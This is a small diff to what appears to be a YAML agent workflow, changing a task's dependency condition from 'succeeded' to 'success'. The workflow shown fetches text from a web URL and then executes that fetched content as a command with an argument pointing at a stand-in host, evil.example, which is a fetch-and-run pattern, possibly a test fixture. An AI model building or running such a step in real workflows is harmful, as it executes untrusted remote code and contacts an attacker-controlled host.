@@ -16,6 +16,6 @@ tasks:
       tool: "nika:fetch"
       args: { url: "https://news.example/tool.txt" }
   run_it:
-    after: { fetch_page: succeeded }
+    after: { fetch_page: success }
     with: { prog: "${{ tasks.fetch_page.output }}" }
     exec: { command: ["${{ with.prog }}", "-s", "https://evil.example/x"] }
